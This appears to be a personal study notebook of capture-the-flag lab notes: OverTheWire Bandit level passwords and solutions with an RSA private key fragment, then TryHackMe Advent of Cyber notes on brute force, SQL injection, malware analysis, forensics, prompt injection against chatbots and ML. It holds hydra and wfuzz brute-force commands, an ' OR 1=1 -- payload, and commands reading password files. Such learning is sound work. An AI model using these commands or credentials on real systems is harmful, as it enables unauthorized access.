R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
“”", to resolve this, first: nmap -p 31000-32000 -T4 localhost --script ssl-cert,ssl-enum-ciphers, and: echo "JQttfApK4SeyHwDlI9SXGR50qclOAil1" | openssl s_client -connect localhost:31790 -ign_eof, this get a rsa certificate
- 18: bandit18: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg, resolve: diff passwords.new passwords.old
- 19: bandit19: awhqfNnAbc1naukrpqDYcF95h7HoMTrC, use `ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'`
- 20: bandit20: VxCazJaVykI6W36BkBU0mJTCM8rR95XT, `./bandit20-do cat /etc/bandit_pass/bandit20`
- 21: bandit21: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq, primero se debe de abrir comunicacion “echo VxCazJaVykI6W36BkBU0mJTCM8rR95XT | nc -l -p 1234 &amp;” y se ejecuta el programa con el puerto asignado
- 22: bandit22: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff, check /etc/cron.d/cronjob_bandit22, check before what is the bash to run and ls -la to see the file and in what file is saved the password
- 23: bandit23: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G, see cron `cronjob_bandit23` cat to script in cronjob, and execute commands using name bandit23
- 24: bandit24: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar, create script to read pasword in /etc/bandit_pass/ and save content in /tmp/. , use of cat in bash script
- 25: bandit25: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d, using for i in {9001..9018}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" &gt;&gt; reoptions01.txt; done and before cat reoptions01.txt | nc localhost 30002 &gt; bfre01.txt, part by batches with 0000..9999 breaks connection
- 26: bandit26: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1, this level is complicated, is necessary activate more in ssh conection without use of `| more`, and using v to checkout to vim, use :r /etc/bandit_pass/bandit26
- 27: bandit27: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS, using the same trick in bandit26 with ssh and smallest terminal with more, use: `vi mode of cat`, `:set shell /bin/bash` and execute `:shell`, execute binary with cat command to /etc/bandit_pass/bandit27
- 28: bandit28: AVanL161y9rsbcJIsFHuw35rjaOM19nR, create a temp dir, and clone repo adding port 2220 to url, cat to README file
- 29: bandit29: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S, create temp dir, clone repo using port 2220, execute git log to get previous commit, change to previous commit: `git checkout {commit}`, and cat to README
- 30: bandit30: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS, create temp dir and clone repo, check all branchs, and change to dev, cat to REAME
- 31: bandit31: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt, create temp dir and clone repo, check in tags and execute: `git show secret`
- 32: bandit32: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y, create temp dir and clone repo, create file key.txt and modify the .gitignore, push to master and this return the password
- 33: bandit33: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy, to get password use $0 to execute shell, in shell open check `whoami`, and get file of password</rich_text>
    </node>
    <node name="sadservers" unique_id="231" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1704004991" ts_lastsave="1704004995"/>
    <node name="natas" unique_id="230" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1704004410" ts_lastsave="1704004437"/>
    <node name="advent of cyber" unique_id="199" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701640955" ts_lastsave="1703454446">
      <node name="day 1" unique_id="200" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701640961" ts_lastsave="1701640964">
        <rich_text>Aprender sobre procesamiento de lenguaje natural
aprender sobre inyeccion prompt
aprender como defenderse contra ataques de inyeccion prompt

un ataque de prompt inyection es manipular un chatbot, insertando ciertas peticiones
es como un ataque de ingenieria social pero contra un chatbot

los “problemas” generales de este tipo son debidos que se usan toneladas de texto para entrenar a la IA, dependiendo de la calidad es la respuesta del chatbot
una solucion para evitar esto es remover los datos sencibles de los datasets, aunque no es tan eficiente como pareciera, para esto se deben agregar medidas de seguridad
para la evasion de estos ataques se podria entrenar otra IA que interfiera los mensajes maliciosos</rich_text>
      </node>
      <node name="day 2" unique_id="201" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701652991" ts_lastsave="1701653873">
        <rich_text>Log Analysis
- introduccion a la ciencia de datos y como puede ser usada en ciberseguridad
- ligera introduccion a python
- como trabajan pandas y Matplotlib para datos
- entender como es la red

Data science:
- el principal elemento es interpretar la data para responder preguntas, se hace uso de programacion, estadistica y recientemente de IA.
- los roles y responsabilidades de un data scientist son:
   → Data collection, se busca data cruda
   → Data processing, se procesa la data cruda dentro de un formato estandar, esta sirve para poder analizar
   → Data mining (clusterizacion/clasificacion), se crean relaciones entre los datos, busqueda de patrones y correlaciones
   → Analysis (exploracion/confirmacion), aqui se exploran los datos para responder preguntas y algunas proyecciones futuras
   → Comunicacion (Visualizacion), se muestran los resultados obtenidos por medio de graficas

En ciber seguridad se usa para deteccion de anomalias asi como para:
- SIEM: colecciona y relaciona grande sumas de datos
- Threat trend analysis: las amenazas pueden ser buscadas y entenedidas
- Predective analysis: sirve para la prevencion de futuros incidentes</rich_text>
      </node>
      <node name="day 3" unique_id="202" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701711779" ts_lastsave="1701717368">
        <rich_text>objetivos
- complejiodad de password y posibles combinaciones
- como la combinaciones de fuerza bruta pueden afectar
- generacion de passwords usando crunch
- intentar passwords usando hydra

factibilidad de fuerza bruta
- cuantos Pins se pueden tener
- cuantos passwords diferentes se peuden generar
- que tanto tiempo toma buscar un password por fuerza bruta

Contando codigos Pin
se pueden tener un total de 10000 pines diferentes, esto suponiendo que hay 4 diferentes numeros a combinar

Contando los passwords
esto dependera del numero de combinaciones y caracteres que podamos tener, por ejemplo
    Al tener 10 digitos numericos, 26 letras minusculas y 26 mayusculas se tiene un total de 14,776,336 combianciones solo eligiendo uno de cada uno
    
Que tanto se puede t ardar un atque de fuerza bruta
esto dependera de cuantos password se pueden usar por segundo
algo mas a tener en cuenta es que tan complejo es el password

Generando lista de password
- usando crunch: `crunch 3 3 0123456789ABCDEF -o 3digits.txt`
   → el primer numero es la longitud minima
   → el segundo es la lingitud maxima
   → los digitos son los que seran usados para crear los passwords
   → -o sirve para salvar los datos

Usando la lista de passwords
- el uso de Hydra es para no tener que meter los password de forma manual
- para revisar y usarlos se requiere saber que metodo se esta usando y como amndar los datos, es como usar selenium
- para usar hydra: `hydra -l ‘’ -P 3digits.txt -f -v {host} http-post-form “/login.php:pin=^PASS^:Access denied” -s {port}`
   → -l ‘’ es para decir que el login name esta en blanco
- pass: 6F5</rich_text>
      </node>
      <node name="day 4" unique_id="203" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701717456" ts_lastsave="1701743932">
        <rich_text>Objetivos
- que es CeWL
- cuales son las capacidades de CeWL
- como se crean listas de palabras usando CeWL
- como se puede configurar la salida para ciertas tareas

Se pronuncia cool, es un generador de listas de palabras
esta herramienta crea la lista basandose en spiders websites
obtiene la estructura, contenido y otros detalles relevantes
tambien puede crear una lista de email o usuarios para identificar a los miembros del equipo

how to use cewl
- usar -h para obtener las opciones
- para generar una lista basica de un sitio web: `cewl </rich_text>
        <rich_text link="webs http://MACHINE_IP`">http://MACHINE_IP`</rich_text>
        <rich_text>
- para salvar la lista de palabras: `cewl </rich_text>
        <rich_text link="webs http://MACHINE_IP">http://MACHINE_IP</rich_text>
        <rich_text> -w output.txt`

Por que CeWL
- es un generador de palabras unico comparado a otras herramientas
- esto debido a que en vez de usar un diccionario de palabras hace uso del contenido de la pagina web
- algunas opciones:
   → lista especifica para el target
   → profundidad de busqueda, este se puede configurar, pero tambien se pueden usar otras paginas
   → Salida customizable
   → tiene enumeracion de usuarios y extraccion de emails usando la meta tags
   → Eficiencia
   → integracion con otras herramientas, este puede ser integrado con pipelines
   → activamente en mantenimiento
- la profundidad especifica se puede usar mediante -d
- el maximo y minimo de caracteres se especifica con -m y -w
- manejo de autenticacion, se puede usar -a
- extensiones custom: con --with-numbers se pueden agregar numeros a las palabras, con --extension permite agregar extensiones a cada palabra
- seguir links externos, usando --offsite, permite hacerlo
- uso de Wfuzz nos va a servir para hacer el ataque de fuerza bruta, sirve para crear diferentes tipos de inyecciones (SQL, XSS, LDAP)
- para usar wfuzz: wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credencials" -u </rich_text>
        <rich_text link="webs http://10.10.55.167/login.php">http://10.10.55.167/login.php</rich_text>
        <rich_text> -d "username=FUZZ&amp;password=FUZ2Z"</rich_text>
      </node>
      <node name="day 5" unique_id="204" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701802128" ts_lastsave="1701812179">
        <rich_text>Objetivo:
- como navegar en un sistema legacy no conocido
- aprender sobre DOS y su conexion con el prompt de comandos de windows
- descubrir el significado de firma de archivos en recuperacion de archivos y analisis de sistemas

Overview
- Dos fue un sistema dominante durante los primeros años de las computadoras personales
- microsoft lo tomo y renombro MS-DOS
- fue la version inicial de windows
- los principios de manejo de archivos, estructura de directorios y sintaxis de comandos vienen desde DOS hasta Windows

Comandos
- CD, cambio de directorio
- DIR, como ls
- TYPE, como un cat
- CLS, como reset
- HELP, como man
- EDIT, como nano

FILE SIGNATURE
- uso de magic bytes, es una secuencia al inicio de los archivos que identifica o verifica el tipo de contenido y formato
- esto es de gran ayuda en el analisis forence, por medio de este se puede identificar archivos maliciosos</rich_text>
      </node>
      <node name="day 6" unique_id="205" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701898509" ts_lastsave="1701898549">
        <rich_text>Memories of Christmas Past

Objetivos:
- entender como ciertos lenguajes no manejan memoria segura
- entender como las variables pueden causar overflow dentro de la memoria y corromperla
- explotar un buffer simple para directamente cambiar la memoria que en teoria no se tiene acceso

A - 41
b - 42
c - 43
d - 44
e - 45
f - 46
g - 47
h - 48
i - 49
j - 4a
k - 4b
l - 4c
m - 4d
n - 4e
o - 4f
p - 50
q - 51
r - 52
s - 53</rich_text>
      </node>
      <node name="day 7" unique_id="206" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701996985" ts_lastsave="1701996991">
        <rich_text>LOG ANALYSIS

Objetivos:
- revisar archivos logs y su importancia
- entender que es un proxy y bajar el contenido de proxy log
- crear CLI linux para parsear log solo manualmente
- analizar un proxy log en casos tipicos

Primer log
- que pasa tras escenas en una computadora o una aplicacion de software
- este guarda eventos, acciones, errores o informacion de que paso
- sirve para diagnosticar problemas, monitorear performance y guarda que se esta haciendo

Que es un proxy server?
- intermedio entre la computadora o dispositivo con el internet
- cuando se pide informacion o acceso a una pagina web, el dispositivo se conecta a un servidor proxy que se conecta al servidor necesario
- son usados para saber que usuarios acceden, cuando y que tanto ancho de banda se usa
- permite crear politicas y bloquear especificos sitios web o ciertas categorias


org:
- ts
- source ip
- domain:port
- http method
- http uri
- status code
- response size
- user agent</rich_text>
      </node>
      <node name="day 8" unique_id="207" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702054338" ts_lastsave="1702056924">
        <rich_text>Disk Forensics

Objectives
- use of FTK Imager
- Analyse digital artefacts and evidence
- Recover daleted digital artefacts and evidence
- verify the integrity of a drive/image used as evidence

Tool of only mount usb drive in read-only mode

FTK Imager
- has UI
   → tree pane, view of added evidence source as hdd, flash drive and forensic image
   → List pane, list of files and folders contained in the selected directory
   → viewer pane, content of selected files in either the evidence
- preview modes
   → automatic mode, optimal preview, use IE for web-related files, display text files, and opens unrecognised file types in their navice applications or as hexadecimal code
   → text mode, allow view fiels as ASCII or unicode text
   → Hex mode, display files in hexadecimal format
   → is possible use Ctrl + F to search specific text
- recovering deleted files and folders
   → expand direcrtories in file list pane and evidence tree pane, right click and select export files
- verify drive/image integrity
   → to check integrity click in Evidence Tree pane and navigate to File &gt; Verify Drive/Image</rich_text>
      </node>
      <node name="day 9" unique_id="209" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702164374" ts_lastsave="1702176817">
        <rich_text>She sells C# shells by the C2Shore

Objetivos:
- fundamentos para el analisis malware de forma segura
- los fudamentos de binarios .NET
- la herramienta dnSpy para descompilar malware escrito en .NET
- Crear una metodologia esencial para el analisis de malware

Manejo de malware 101
--- CUIDADO: el manejo de malware es peligroso, siempre tome cuidado con el analisis
- software diseñado especificamente para causar daño
- hacer uso de un sandbox, para parecer a una real, este sirve para aislay y que no afecte algo mas
- el setup para un sandbox contiene:
   → control de red: para limitar y monitorear el trafico de la red, este previene la propagacion del malware en otros lados
   → virtualizacion: uso de VMware, VirtualBox o Hyper-V para tener un mejor control e isolado
   → monitoreo y logging: guardado de logs, del malware, interaccion de sistemas, trafico de la red y modificacion de archivos

Introduccion a binarios compilados .NET
- binarios escritos en C#, VB.NET, F# o C++
- estos se ejecutan con un .exe o una librearia dinamica (dll)
- en .NET o C# se hace uso de un lenguaje intermedio, algo como un pseudocodigo y es traladado dentro de codigo maquina usando el entorno CRL
- es mas facil decompilar un binario en C# que en C/C++ ya que C# tse puede obtener del lenguaje intermedio

C2 primer
- command and control, centralizacion o infraestructura que un malicioso actor usa remotamente para manegar y comprometer los dispositivos o sistemas
- este se ejecuta dentro de la maquina de la victima, una vez ejecutado, el atacante accedera al sistema
- existen diferentes tipos, estos son:
   → HTTP requests: se hace uso de HTTP(s), estos pueden enviar y recibir data
   → Command execution: es el mas comun, permite a los atacantes ejecutar comandos dentro de la maquina
   → Sleep or delay: para evadir detecciones y mantener el sigilo, se deja el malware desactivo o dormido por un periodo especifico, este se activa solo cuando se activa pasando cierto tiempo

Descompilando Malware con dnSpy
- es open source assembly, debbuger y editor
- es usado para ingenieria inversa
- es user-friendly</rich_text>
      </node>
      <node name="day 10" unique_id="210" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702260967" ts_lastsave="1702261003">
        <rich_text>Sql Injection, Inject the halls with EXEC Queries

Objetivos:
- aprender como entender e identificar injecciones vulnerables de SQL
- explorar que consultas SQL pueden servir para ejecucion remota de codigo

SQL
- usado para trabajar con bases de datos relacionales y crear sitios web dinamicos
- las bases de datos estructuradas que guardar las colecciones dentro de tablas, cada una consistente de varias filas y columnas,
- estas tablas tienen relacion facilitando eficientemente la organizacion de los datos

PHP
- popular lenguaje de scripting que toma un rol muy importante en el desarrollo web
- permite crear sitios web dinamicos e interactivos
- este genera el HTML desde el servidor
- tiene una muy buena integracion con bases de datos de SQL
- es un lenguaje de scripting del lado de servidor
- la conexion se hace generalmente por PDO (PHP Data Objects), con librerias como MySQLi o sqlsrv

User Input
- lo importante de todo esto es la entrada de los usuarios para obtener resultados
- lo mas comun es usar parametros tipo GET

SQLi (SQL Injection)
- vulnerabilidades que se pueden dar por medio del contenido dinamico
- es el uso de ataques que explotan las entradas de usuario usando consutlas SQL
- es un riesgo ya que puede tener accesos no autorizados, manipulacion de datos, o comprometer una aplicacion web 
- para evitar esto debe de tener una apropiada validacion y sanitizacion
- uno de los tantos es: ' OR 1=1 --

OR 1=1
- es tipicamente usado para evitar la autenticacion o regresar todos los items en una tabla haciendo siempre verdadera la condicion

Stacked Queries
- estos vienen en varias formas
- es cuando un atacante quiere tomar control
- es una inyeccion donde se acaba la consulta original y ejecutar mas inyecciones
- por medio de el semicolon, esto permite ejecutar multiples sql dentro de una misma interaccion

- xp_cmdshell, es usado para ejecutar comandos de sistema desde sql

REMOTE CODE EXECUTION
- uso de certutil.exe
- creacion de payloads usando MSFVenom, permitiendonos usar un shell reverso

Protegerse contra ataques:
- validacion de entradas
- parametrizacion de queries que interactuan con la base de datos
- store procedures, encapsulamiento de logica en procedimientos lo mas posible</rich_text>
      </node>
      <node name="day 11" unique_id="211" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702322380" ts_lastsave="1702324850">
        <rich_text>Active Directory, Jingle bells, shadow spells

Objetivos:
- entendender active directory
- introduccion a windows para negocios
- prerequisitos para explotar privilegios de escritura genericos
- como atacan las credenciales sombra
- como explotar vulnerabilidades

Active Directory 101
- sistema usado principalmente por windows
- sistema centralizado de autenticacion
- este maneja guardado de datos, autenticacion y autorizacion

Password are hard to remember - say hello to WHfB
- Windows Hello for Business es un moderno y segura manera para reemplzar autenticacion basada en password
- a este se accede mediante Active Directory usando un PIN o biometricos conectados a un par de llaves publcia y privada
- procedimiento para guardar un par de certificados:
   → Trusted Platform Module public-private pair generator
   → peticion de certificado de cliente, uso de un certificado de autoridad (CA) recive y provee un certificado valido
   → se guarda la llave
- Proceso de autenticacion:
   → Autorizacion: el dominio descifra la preautenticacion del cleinte usando la llave publica
   → Generacion de certificado: este es creado por el controlador de dominio y es enviado de regreso al cliente
   → Autenticacion: despues el cliente puede acceder usando el certificado

Enumeracion
- por falta de configuracion apropiadas
- primero checar permisos vulnerables de acuerdo al usuario

Explotacion
- una herramienta para abusar de la vulnerabilidad es Whisker
- esta escrita en C# 
- se hace uso del protocolo kerberos
- Rubeus, es un toolset echo en C# para intereccion directa con kerberos</rich_text>
      </node>
      <node name="day 12" unique_id="212" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702398614" ts_lastsave="1702398618">
        <rich_text>Defense in Depth

- Defensa en profundidad
- Hardening basico de endpoints
- metodologia Simple Boot2Root

Camino guiado de la cadena de ataque
- servidor vulnerable por diseño
- contiene falta de configuracion que han sido pobremente o simplemente no existen

Guide for hardening
- removal user from sudo group: sudo deluser {user} {group}
- check: sudo -l -U {user}

Hardening SSH
- busqueda de escalamiento de privilegios
- disabled password-based SSH

Stronger password policies
- password is weak susceptible to a bruteforce
- bad password practices

Promoviendo cero confianza (zero trust)
</rich_text>
      </node>
      <node name="day 13" unique_id="213" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702514972" ts_lastsave="1702534176">
        <rich_text>Deteccion de intrusis, to the post, through the walls

Objetivos
- aprender como se conoce un analisis atravez del modelo diamante
- identificar estrategias de defensa que pueden ser aplicadas al modelo diamante
- aprender como configurar reglas de firewall y tener un honeypot como estrategia defensiva

Introduccion
- deteccion y prevension de intrusos, es el compenente critico de la ciberseguridad

Analisis de incidente
- es necesario un framework para profilar al atacante, entender sus movimiento y ayudarnos a fortalecer nuestras defensas
- es un framework de analisis de seguridad para desenmascarar las operaciones del adversario e identificar los elementos usados para la intrusion
- tiene 4 facetas, interconectadas en forma de buena orquestacion:
   → adversario
   → victima
   → infraestrcutura
   → capacidad

Adversario
- peuden ser un solo operador o una organizacion entera

Victima
- el objetivo del atacante

Infraestructura:
- conecciones logicas y fisicas que uso el adversario

Capacidad
- que skills, herramientas o tecnicas se usaron
   → Phishing: uso de mensajes o correos para obtener la infrmacion
   → Explotar vulnerabilidades:se explotan vulnerabilidades en software, sistemas y redes
   → Ingenieria social: manipulacion psicologica para obtener acceso
   → ataques de malware:deploy de softwre malicioso, como virus, 
   → amenaza interna: individous dentro de la organizacion quien han hecho mal uso y comprometieron los sistemas
   → ataques DoS: exceso de trafico o peticiones

Modelo defensivo de diamante
- uso de capacidad e infraestructura para defenderse
- Capacidades
   → the best defensive is ofensive
   → two main elements:
      ⇒ Caza de amenezas: proactive e iterativo proceso, bsuqueda de actividad maliciosa o debilidades en seguridad
      ⇒ manejo de vulnerabilidades: procesos de indentificar, evaluacion, priorizacion, mitigazion y monitoreo de vulnerabilidades
- Infraestructura
   → tools to repel cyber-attreset
   → Firewall
      ⇒ guardian de redes y sentinela de la ciber seguridad
      ⇒ is software or hardware or both
      ⇒ stateless/packet filter: inspecciona y filtra paquetes individuales, basado en un set de reglas, teniendo en cuenta origen y destino de la ip, direccion, puertos y protocolos
      ⇒ stateful inspection: mas sofisticado, usado para seguir el estado de la red y por medio de este hacer filtracion
      ⇒ serivio proxy: protege la red filtrando mensajes en la capa de aplicacion, proveyendo una profunda y mas granular inspeccion
      ⇒ web application firewall (WAF): protege applicaciones web, se usa para sql injection, cross-site scripting  y DOS
      ⇒ siguiente generacion de firewall: combina stateless, stateful y proxy para la deteccion de intrusos, prevencion y filtrado de contenido

Comandos de configuracion
- sudo ufw status

HoneyPot
- es un mecanismo que se presenta como confiable para ser el objetivo del atacante
- vienen en varios formatos, software, aplicaciones, servidores o redes enteras
- hay dos tipos:
   → de baja interaccion, son simples sistemas como servidores y bases de datos, ellos activan cuando son atacadas, sirven para detectar nuevas tecnicas
   → de alta interaccion, emulan sistemas complejos como sistemas operativos y redes</rich_text>
      </node>
      <node name="day 14" unique_id="214" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702592748" ts_lastsave="1702596000">
        <rich_text>ML, the little machine that wanted to learn

Objectivos:
- que es machine learning?
- estructuras y algoritmos basicos de machine learning
- usando redes neuronales para hacer predicciones

Introduccion
- creacion de una red neuronal

De 0 a heroe en IA
- un mejor termino es machine learning
- es un sistema que imita el ambiente que vemos en la vida real
- ejemplos:
   → genetic algorithm: imitan el proceso de seleccion natural y evolucion, “el hijo mas fuerte” y “superviviencia del mas adaptado”
   → particle swarm: imita a las aves que vuelan juntas a un punto especifico, este busca la respuesta optima por medio de varias particulas
   → neural networks: este imita a las neuronas del cerebro para resolver el problema

Estilos de aprendizaje
- aprendizaje supervisado, en este se da la entrada con la que la IA se va a ir guiando para darnos resultados con nuevos datos
- aprendizaje no supervisado, aqui no se tiene una etiqueta, la IA aprende de acuerdo a los datos que se le han dado para ir sacando conclusiones

Estructura basica:
- capa de entrada, es la capa donde se ponen los datos, el numero de nodos de entrada sera igual al numero de variables
- capa de salida, esta es la que da el resultado final que se esta buscando, el numero de salidas es igual al numero de posibles valores esperados
- capas intermedias, en estas capas se hace el procesamiento, pueden ser varias de estas para el procesado de los datos
- inputs no son directamente sumadas: cada entrada es multiplicada por un valor para enviarse a la siguiente capa
- la usma de las salidas no es directamente obtenida, la salida es primero pasada por una funcion de activacion, esta salida generalmente esta entre 0 y 1 o -1 y 1
- existen dos pasos para entrenar la red neuronal, feed-forward step y back-propagation step

Feed-Forward loop
- es como se envia la informacion a travez de la red y se obtiene la respuesta de otro lado, una vez entrenada este es el unico paso que necesitamos mejorar
- se siguen los siguientes pasos:
   → normalizar todas las entradas, todas las entradas deben de estar en el mismo rango de valores, para tomar la mejor decision
   → alimentar las entradas a los nodos desde la capa de entrada, se pueden dar los datos en la red
   → propagar la data a travez de la red, en cada nodo se suman todas las entradas y corren a travez de la red, esto se repite hasta la salida de la red
   → leer la salida desde la red, aqui se reciben los datos de salida desde los nodos, la respuesta esta ente 0 y 1, pero aqui se debe de hacer una salida binaria

Back-Propagation
- meintras que feed-forward es solo la mitad del camino, se requiere saber cual es la respuesta correcta
- calcular la diferencia entre las salidas recibidas y las esperadas, se calcula lo obtenido y se compara con lo que se estaba buscando, por medio de este valor se recalcula para hacer mas precisa la red
- actualizar los pesos de los nodos, una vez obtenidos los cambios se actualizan los pesos de las demas capas
- propagar las diferencias de regreso a las otras capas, una vez obtenido los cambios se checa con los demas nodos para hacer los cambios necesarios, este proceso se repite varias veces hasta tener resultados optimos

Dataset Splits
- para poder entrenar la red se dividen los datos para ver que realmente no tenga sobreentrenamiento
- se divide generalmente en 3 partes: training data (datos para entrener la red, es del 70 al 80% de los datos), validation data (este se usa para validar el entrenamiento, este es entre 10 a 15%) y testing data (se calcula el performance final de la red, este es entre el 10 al 15%)</rich_text>
      </node>
      <node name="day 15" unique_id="215" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702694415" ts_lastsave="1702697404">
        <rich_text>Machine Learning, jingle bells SPAM: ML saves the day

Se desea crear un detector de spam usando machine learning

Objetivos:
- diferentes pasos en un pipeline de generico ML
- ML para clasificacion y entrenamiento de modelos
- como partir un dataset para entrenar y probar
- como preparar el modelo de ML
- como evaluar la eficiencia del modelo

Explorando el pipeline de ML
- es una serie de pasos envueltos en crear y desplegar un modelo de ML
- un tipico pipeline incluye:
   → ingestion
   → limpieza
   → preprocesamiento
   → modelado
   → desplegado
- Collection de datos
   → es el proceso de recuperar data cruda desde varias fuentes para ser usadas por el ML.
   → esta puede venir de diferentes partes, como bases de datos, archivos de texto, APIs, repositorios online, sensores, sobrevivientes, scrapeo de webs y otros
   → se hace una revision de los datos obtenidos
- Procesado de datos
   → Limpieza, corregir errores, llenar valores perdidos, quitar ruido, y manejar outliers
   → normalizacion, se escalan los datos numericos dentro de un rango uniforme, tipicamente [0, 1] y [-1, 1]
   → estandarizacion, reescalar la data para tener una media de - y una desviacion estandar de 1
   → extraccion de variables, transformacion de datos como texto o imagenes en valores numericos
   → reduccion de dimensiones, reducir el numero de variables bajo consideracion de obtener un set de variables principales
   → discretizacion, transformar variables continuas dentro de discretas
   → procesamiento de texto, crear tokens, steamming, lemmatization, convertir el texto a un formato usable para ML
   → imputacion, reemplazar valores perdidos con valores estadisticos
   → ingenieria de variables, creacion de nuevas variables o modificar las existentes para mejorarlas
- entrenamiento y test, partiendo del dataset
   → es importante este paso ya que con el podemos probar que el modelo sea indicado y tenga buen performance
- entrenamiento del modelo
   → se tienen diferentes formas de entrenar un modelo, los mas comunmente usados para texto son:
      ⇒ naive bayes, modelo probabilistico basdo en el teoream de bayes
      ⇒ SVM, es un clasificador robusto, que busca el hiperplano optimo para separar diferentes clases, hace uso de funciones kernel no lineales y de alta dimensionalidad
      ⇒ regresion logistica, hace uso de la funcion de regresion logistica, este es usado para modelos binarios
      ⇒ arboles de decision, un modelo que usa un arbol tipo grafo, donde se pueden poner sus posibles soluciones
      ⇒ random forest, es un conjuncion de multiples arboles de decision
      ⇒ Gradient Boosting Machines, un conjunto de aprendizajes, para crear fuertes predicciones
      ⇒ K-Nearest Neighbors (KNN), es un modelo no parametrico que clasifica cada punto basdo en el mayor numero de votos cercanos de sus vecinos
- Entrenamiento con Naive Bayes
   → se tiene varios mails etiquetados como spam y ham
   → el modelo aprende de estos datos, se checa con que frecuencia aparecen las palabras de acuerdo a su etiquetado
   → este calcula la probnabilidad de que el email sea o no spam de acuerdo al numero de palabras
- Evaluacion del modelo
   → despues de entrenar el modelo es necesario evaluarlo, este se puede checar si accuracy, precision y recall
   → Precision, que tantos predicciones positivas hizo
   → Sencibilidad (recall), cual de todos los ejemplos positivos han sido acertados
   → F1-Score, la media harmonicade la precision y recall, cuales fueron clasificados incorrectamente
   → Soporte, numero de ocurrencias actuales de la clase en el dataset especifico
   → Exactitud, el total de observaciones correctamente predictas
   → Promedio macro, este promedia los pesos por etiqueta
   → Promedio de pesos, promedia los pesos soportados por cada etiqueta
- Testeando el modelo
   → una vez obtenidos resultados se puede probar con mas datos, nuevos</rich_text>
      </node>
      <node name="day 16" unique_id="216" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702764741" ts_lastsave="1702777585">
        <rich_text>ML, can't captcha this machine

Objetivos:
- estructuras complejas de redes neuronales
- como funciona una red neuronal convexa
- usando redes neuronales para reconocimiento de caracteres
- integrando redes neuronales dentro de las herramientas del red team

Introduccion
- ver como los read team pueden usar ML

Convolutional Neural Networks (CNN)
- tienen la habilidad de extraer variables que pueden ser usadas para entrenar redes neuronales
- en estas se tiene una extraccion de variables como parte de la red
- aqui se usa algebra lineal
- Se pueden dividir en tres componentes principales:
   → Extraccion de variables
   → Capas completamente conectadas
   → Clasificacion

Extraccion de variables
- son usadas para clasificar imagenes
- se usan para romper CAPTCHAs
- Representacion de imagenes
   → la computadora precive las imagenes como arreglos 2D de pixeles
   → un valor de pixel describe que color puede verse, hay dos valores
